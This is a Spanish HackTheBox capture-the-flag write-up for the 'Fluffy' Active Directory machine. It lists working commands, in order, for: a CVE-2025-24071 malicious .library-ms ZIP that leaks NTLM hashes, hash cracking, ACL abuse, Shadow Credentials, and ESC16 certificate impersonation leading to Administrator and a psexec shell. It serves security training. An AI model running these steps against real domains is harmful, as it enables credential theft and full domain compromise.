---
title: "HTB: Fluffy"
date: 2026-04-12 12:00:00 +0000
categories: [WriteUp, HackTheBox]
tags: [Active Directory, Windows, ADCS, ESC16, ShadowCredentials, NTLM, CVE-2025-24071]
image:
  path: /assets/img/Fluffy-HTB.png
  alt: HackTheBox Fluffy Machine
  width: 500
  height: 280
  class: sz-contain
---

## Introducción

**Fluffy** es una máquina de dificultad **Fácil** en **HackTheBox**, enfocada en entornos de
**Active Directory**. El vector de acceso inicial se obtiene mediante la explotación del
**CVE-2025-24071**, una vulnerabilidad en **Windows Explorer** que permite la divulgación de
hashes **NTLM** a través de archivos `.library-ms` maliciosos. Una vez obtenidas las
credenciales del usuario `p.agila`, se realiza una enumeración del dominio con **BloodHound**,
identificando una cadena de abuso de **ACLs** que permite añadir usuarios a grupos privilegiados.
Aprovechando el permiso **GenericWrite** sobre cuentas de servicio, se aplican técnicas de
**Shadow Credentials** para obtener acceso como `winrm_svc` y posteriormente como `ca_svc`.
Finalmente, se explota una mala configuración en **Active Directory Certificate Services (ADCS)**
conocida como **ESC16**, que permite suplantar al usuario `Administrator` mediante la manipulación
del atributo **UPN**, obteniendo así control total del dominio.

---

## Reconocimiento

### Comprobación de conectividad

```bash
ping -c 1 10.129.17.155
```

```
64 bytes from 10.129.17.155: icmp_seq=1 ttl=127 time=94.3 ms
```

### Escaneo de Puertos

```bash
rustscan -a $IP --ulimit 1000 -r 1-65535 -- -A -sC -sV -Pn -o nmapresult.txt
```

**Resultados relevantes:**

| Puerto  | Estado | Servicio                  |
|---------|--------|---------------------------|
| 53      | open   | Simple DNS Plus           |
| 88      | open   | Kerberos                  |
| 139     | open   | NetBIOS                   |
| 389     | open   | LDAP (AD)                 |
| 445     | open   | SMB                       |
| 464     | open   | Kpasswd5                  |
| 593     | open   | RPC over HTTP             |
| 636     | open   | LDAPS                     |
| 3268    | open   | LDAP Global Catalog       |
| 3269    | open   | LDAPS Global Catalog      |
| 5985    | open   | WinRM (HTTP)              |
| 9389    | open   | .NET Message Framing      |

### Análisis del escaneo

Los puertos habituales de **Active Directory** confirman que el host es un **Controlador de Dominio** del entorno `fluffy.htb`.

**Observaciones clave:**

- **ADCS detectado:** Se detecta la CA interna `fluffy-DC01-CA`. Señal temprana de que la escalada probablemente involucre abuso de templates de certificados.
- **Firma SMB obligatoria:** Descarta relay NTLM, pero **no descarta la captura de hashes** si logramos que el servidor inicie conexiones SMB hacia nosotros — que es exactamente lo que hace CVE-2025-24071.
- **Share IT con permisos READ,WRITE:** Un recurso compartido escribible en un DC es inusual y debe investigarse como vector de entrega de archivos maliciosos.
- **Desfase horario:** Crítico para Kerberos. Sincronizar con `sudo ntpdate -u $IP` antes de cualquier ataque.

---

## Enumeración inicial (NXC)

### Enumeración de usuarios

```bash
nxc smb $IP -u 'p.agila' -p 'prometheusx-303' --users
```

```
SMB  10.129.17.155  445  DC01  [+] fluffy.htb\p.agila:prometheusx-303
SMB  10.129.17.155  445  DC01  Administrator  2025-04-17 15:45:01  0
SMB  10.129.17.155  445  DC01  ca_svc         2025-04-17 16:07:50  0
SMB  10.129.17.155  445  DC01  ldap_svc       2025-04-17 16:17:00  0
SMB  10.129.17.155  445  DC01  p.agila        2025-04-18 14:37:08  0
SMB  10.129.17.155  445  DC01  winrm_svc      2025-05-18 00:51:16  0
SMB  10.129.17.155  445  DC01  j.coffey       2025-04-19 12:09:55  0
SMB  10.129.17.155  445  DC01  j.fleischman   2025-05-16 14:46:55  0
```

### Enumeración de recursos compartidos

```bash
nxc smb $IP -u 'p.agila' -p 'prometheusx-303' --shares
```

```
SMB  10.129.17.155  445  DC01  Share      Permissions
SMB  10.129.17.155  445  DC01  ADMIN$
SMB  10.129.17.155  445  DC01  C$
SMB  10.129.17.155  445  DC01  IPC$       READ
SMB  10.129.17.155  445  DC01  IT         READ,WRITE
SMB  10.129.17.155  445  DC01  NETLOGON   READ
SMB  10.129.17.155  445  DC01  SYSVOL     READ
```

El share **IT** con permisos **READ,WRITE** es el vector clave. Un share escribible por un usuario normal en un DC indica que los usuarios depositan archivos ahí para que otros los consuman — un escenario perfecto para entrega de archivos maliciosos.

### Enumeración del share IT

```bash
nxc smb $IP -u 'p.agila' -p 'prometheusx-303' --share IT -M spider_plus -o SHARE=IT
cat /home/lexo/.nxc/modules/nxc_spider_plus/10.129.17.155.json
```

```json
{
    "IT": {
        "Everything-1.4.1.1026.x64.zip": { "size": "1.74 MB" },
        "KeePass-2.58.zip": { "size": "3.08 MB" },
        "Upgrade_Notice.pdf": { "size": "165.98 KB" }
    }
}
```

El `Upgrade_Notice.pdf` destaca — es un documento de texto mientras los otros son instaladores. Lo descargamos:

```bash
nxc smb $IP -u 'p.agila' -p 'prometheusx-303' --share IT \
  --get-file 'Upgrade_Notice.pdf' './Upgrade_Notice.pdf'
```

![PDF](/assets/img/fluffy/pdf.png)

El PDF documenta el **CVE-2025-24071** como un aviso de actualización pendiente del departamento IT. Esto es una pista directa: el sistema es vulnerable a esta CVE y hay usuarios que acceden a este share regularmente (de ahí los instaladores depositados ahí).

---

## CVE-2025-24071 — NTLM Hash Disclosure via .library-ms

### ¿Qué es CVE-2025-24071 y cómo funciona internamente?

**CVE-2025-24071** es una vulnerabilidad de divulgación de credenciales en **Windows Explorer** que afecta al manejo de archivos `.library-ms` (archivos de definición de biblioteca de Windows).

**¿Qué son los archivos `.library-ms`?**

Las "bibliotecas" de Windows (Documents, Music, Videos, etc.) son abstracciones que agrupan múltiples carpetas en una vista unificada. Su definición se almacena en archivos XML con extensión `.library-ms`. Contienen rutas a las carpetas que forman la biblioteca, y esas rutas pueden ser **rutas UNC** (`\\servidor\recurso`).

**¿Dónde está la vulnerabilidad?**

Cuando Windows Explorer procesa un archivo `.library-ms` — incluso simplemente al extraer un ZIP que lo contiene, sin que el usuario haga doble clic — intenta **resolver automáticamente las rutas UNC** especificadas en el XML para construir la vista de la biblioteca. Al resolver una ruta UNC como `\\10.10.14.116\shared`, Windows inicia una **conexión SMB** hacia esa IP e intenta autenticarse usando las credenciales del usuario actual.

Esta autenticación SMB usa **NTLMv2**, que incluye un hash de la contraseña del usuario. Un atacante que esté escuchando con Responder captura ese hash sin ninguna interacción adicional del usuario — solo hace falta que Windows Explorer procese el archivo.

**Flujo completo:**

```
Atacante sube update_patch.zip al share IT
    │
    ▼
Usuario del dominio navega al share IT con Windows Explorer
    │
    ▼ (Windows Explorer extrae automáticamente la preview del ZIP)
Explorer procesa el .library-ms dentro del ZIP
    │
    ▼
Explorer intenta resolver \\10.10.14.116\shared (ruta UNC del atacante)
    │
    ▼
Windows envía autenticación NTLMv2 al "servidor SMB" del atacante
    │
    ▼
Responder captura el hash NTLMv2
    │
    ▼
Atacante crackea el hash offline → contraseña en texto claro
```

**¿Por qué el share IT escribible es el vector perfecto?**

Porque los usuarios del departamento IT acceden regularmente a ese share (depositan instaladores ahí). Solo necesitamos subir el ZIP malicioso y esperar a que alguien lo vea en Explorer.

### Explotación

```bash
python3 CVE-2025-24071.py -i 10.10.14.116 -n update_patch
```

```
[*] Generating malicious .library-ms file...
[+] Created ZIP: output/update_patch.zip
[!] Done. Send ZIP to victim and listen for NTLM hash on your SMB server.
```

Iniciamos Responder y subimos el archivo:

```bash
sudo Responder -I tun0 -v

nxc smb $IP -u 'p.agila' -p 'prometheusx-303' --share IT --put-file output/update_patch.zip update_patch.zip
```

Responder captura el hash NTLMv2 de `p.agila`:

```
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:24fb59e71aa944f8:908DB9403F...
```

**¿Por qué crackeamos el hash si ya teníamos la contraseña de p.agila?**

Las credenciales iniciales eran proporcionadas por el creador de la máquina para simular el punto de partida. En un escenario real, el hash capturado sería la primera credencial obtenida — y como vemos, crackea correctamente:

```bash
hashcat -m 5600 pagila_hash /usr/share/wordlists/rockyou.txt
```

**Resultado:** `prometheusx-303`

---

## Análisis de Dominio — BloodHound

```bash
bloodhound-ce-python -u 'p.agila' -p 'prometheusx-303' -d fluffy.htb -ns $IP -c All --zip
```

### Ruta de ataque identificada

BloodHound revela que `p.agila` es miembro del grupo **Service Account**, y este grupo tiene `GenericAll` sobre el grupo **Service Accounts**.

![GenericAll](/assets/img/fluffy/genericall.png)

Una vez en **Service Accounts**, el grupo tiene `GenericWrite` sobre las cuentas de servicio (`ca_svc`, `ldap_svc`, `winrm_svc`):

![Shadow Path](/assets/img/fluffy/genericwrite.png)

`GenericWrite` sobre una cuenta de usuario habilita **Shadow Credentials** — la técnica que usaremos para obtener acceso sin conocer la contraseña.

### Añadir p.agila al grupo Service Accounts

```bash
bloodyAD --host $IP -d fluffy.htb -u 'p.agila' -p 'prometheusx-303' add GroupMember "SERVICE ACCOUNTS" "p.agila"
```

```
[+] p.agila added to SERVICE ACCOUNTS
```

---

## Shadow Credentials — Acceso como WINRM_SVC y CA_SVC

### ¿Qué son Shadow Credentials?

**Shadow Credentials** es una técnica de ataque que abusa del atributo **`msDS-KeyCredentialLink`** de las cuentas de AD. Este atributo fue introducido con **Windows Hello for Business** y permite asociar **credenciales de clave pública (certificados)** a una cuenta de usuario o equipo como método de autenticación alternativo a la contraseña.

**¿Cómo funciona legítimamente?**

Windows Hello for Business escribe en `msDS-KeyCredentialLink` la clave pública del dispositivo del usuario. Cuando ese usuario inicia sesión con Windows Hello (PIN, huella, reconocimiento facial), el dispositivo usa la clave privada para autenticarse vía **PKINIT** sin necesidad de contraseña.

**¿Cómo lo abusamos?**

Si tenemos `GenericWrite` sobre una cuenta, podemos escribir en `msDS-KeyCredentialLink` **nuestra propia clave pública**. Esto no modifica la contraseña actual de la víctima — la cuenta sigue funcionando con su contraseña original, sin alertas para el usuario.

Con nuestra clave privada registrada en la cuenta víctima, podemos autenticarnos como esa cuenta mediante PKINIT y obtener su TGT + hash NT (via UnPAC-the-Hash), todo sin conocer su contraseña.

**¿Por qué es sigiloso?**

- No cambia la contraseña del usuario.
- No genera eventos de cambio de credenciales.
- El atributo `msDS-KeyCredentialLink` raramente es monitoreado en entornos sin Windows Hello for Business.

**Flujo del ataque:**

```
Atacante tiene GenericWrite sobre winrm_svc
    │
    ▼
bloodyAD escribe clave pública del atacante en msDS-KeyCredentialLink de winrm_svc
    │
    ▼
Atacante usa clave privada para autenticarse como winrm_svc vía PKINIT
    │
    ▼
KDC emite TGT para winrm_svc (verifica la clave contra msDS-KeyCredentialLink)
    │
    ▼
UnPAC-the-Hash → hash NT de winrm_svc (sin crackear)
    │
    ▼
Pass-the-Hash → Evil-WinRM como winrm_svc
```

### Shadow Credentials sobre WINRM_SVC

```bash
bloodyAD --host $IP -d fluffy.htb -u 'p.agila' -p 'prometheusx-303' \
  add shadowCredentials winrm_svc
```

```
[+] KeyCredential generated with sha256: 541f3083fed69f161ab1ef2b7a4a63ac7cf949f1c9a489de3f9527d4067cef9f
[+] TGT stored in ccache file winrm_svc_6C.ccache
NT: 33bd09dcd697600edf6b3a7af4875767
```

```bash
evil-winrm -i $IP -u 'winrm_svc' -H '33bd09dcd697600edf6b3a7af4875767'
```

```powershell
*Evil-WinRM* PS C:\Users\winrm_svc> type Desktop\user.txt
019b99194676f8d62a72d19c63cf6092
```

### Shadow Credentials sobre CA_SVC

El siguiente objetivo es `ca_svc` — la cuenta de servicio de la CA de ADCS. Comprometer esta cuenta nos dará el contexto necesario para abusar de la configuración ADCS del dominio:

```bash
bloodyAD --host $IP -d fluffy.htb -u 'p.agila' -p 'prometheusx-303' add shadowCredentials ca_svc
```

```
[+] TGT stored in ccache file ca_svc_VE.ccache
NT: ca0f4f9e9eb8a092addf53bb03fc98c8
```

---

## Escalada de Privilegios — ESC16

### Enumeración ADCS

```bash
certipy find -u ca_svc -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip $IP -enabled -vulnerable -stdout
```

```
[!] Vulnerabilities
  ESC16: Security Extension is disabled.
```

### ¿Qué es ESC16?

**ESC16** es una vulnerabilidad en ADCS descubierta en 2024. Se produce cuando la CA tiene deshabilitada la **Security Extension** (también conocida como **szOID_NTDS_CA_SECURITY_EXT**, OID `1.3.6.1.4.1.311.25.2`).

**¿Qué hace la Security Extension?**

Cuando está habilitada, la CA incrusta en cada certificado emitido el **SID del objeto de AD** del solicitante, además del UPN. Este SID está firmado por la CA y no puede ser falsificado. Cuando el KDC valida el certificado durante PKINIT, usa el SID incrustado para identificar al usuario de forma inequívoca, **independientemente del UPN**.

**¿Qué pasa cuando está deshabilitada?**

Sin Security Extension, el KDC identifica al usuario **únicamente por el UPN** del campo SAN del certificado. Si podemos modificar el UPN de una cuenta antes de solicitar el certificado, el KDC asociará el certificado al usuario cuyo UPN hayamos especificado.

**¿Por qué necesitamos ca_svc específicamente?**

Porque `ca_svc` es la cuenta que ejecuta el servicio de la CA. En muchos entornos, esta cuenta tiene permisos especiales en ADCS. Más importante: la CA emite certificados en el contexto de los templates disponibles para la cuenta solicitante. `ca_svc` puede solicitar el template **User** — un template estándar que incluye Client Authentication y donde el solicitante puede especificar el UPN.

**Flujo completo del ataque:**

```
ca_svc tiene UPN original: ca_svc@fluffy.htb
    │
    ▼
Paso 1: Modificar UPN de ca_svc → Administrator@fluffy.htb
        (posible porque tenemos GenericWrite sobre ca_svc)
    │
    ▼
Paso 2: Solicitar certificado del template User como ca_svc
        CA emite certificado con UPN = Administrator@fluffy.htb
        (la CA no verifica si ca_svc es realmente Administrator)
    │
    ▼
Paso 3: Restaurar UPN original de ca_svc
        (limpieza para no romper el servicio real de la CA)
    │
    ▼
Paso 4: Autenticarse con el certificado vía PKINIT
        KDC busca usuario con UPN Administrator@fluffy.htb → Administrator
        KDC emite TGT para Administrator
    │
    ▼
Hash NT de Administrator vía UnPAC-the-Hash
```

### Paso 1 — Modificar el UPN de ca_svc

```bash
certipy account update -u 'ca_svc@fluffy.htb' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip $IP -user 'ca_svc' -upn 'administrator'
```

```
[*] Successfully updated 'ca_svc'
    userPrincipalName: Administrator@fluffy.htb
```

### Paso 2 — Solicitar certificado con el UPN modificado

En este momento, la cuenta `ca_svc` tiene el UPN `Administrator@fluffy.htb`. Al solicitar el template **User**, la CA incrusta ese UPN en el SAN del certificado:

```bash
certipy req -u 'ca_svc@fluffy.htb' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip $IP -ca 'fluffy-DC01-CA' -target 'DC01.fluffy.htb' -template 'User'
```

```
[*] Got certificate with UPN 'Administrator@fluffy.htb'
[*] Saving certificate and private key to 'administrator.pfx'
```

> **Importante:** Después de obtener el certificado, restaurar el UPN de `ca_svc` a su valor original para no romper el servicio de la CA en producción:
> ```bash
> certipy account update -u 'ca_svc@fluffy.htb' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip $IP -user 'ca_svc' -upn 'ca_svc@fluffy.htb'
> ```

### Paso 3 — PKINIT y UnPAC-the-Hash

```bash
certipy auth -pfx administrator.pfx -dc-ip $IP
```

```
[*] Got TGT
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```

El KDC buscó un usuario con UPN `Administrator@fluffy.htb`, encontró al Administrator, y emitió el TGT. **UnPAC-the-Hash** extrae el hash NT del PAC incluido en el TGT.

---

## Acceso Final como Administrador

Usamos el ccache del TGT para autenticarnos vía Kerberos con psexec:

```bash
export KRB5CCNAME=administrator.ccache

psexec.py -k -no-pass administrator@DC01.fluffy.htb
```

```
[*] Found writable share ADMIN$
[*] Creating service on DC01.fluffy.htb.....

Microsoft Windows [Version 10.0.17763.6893]

C:\Windows\system32>
```

```powershell
C:\Windows\system32> type c:\users\administrator\desktop\root.txt
303a3db24395f5bb0760b5f6ee41c53e
```

**¡Máquina comprometida con éxito!**
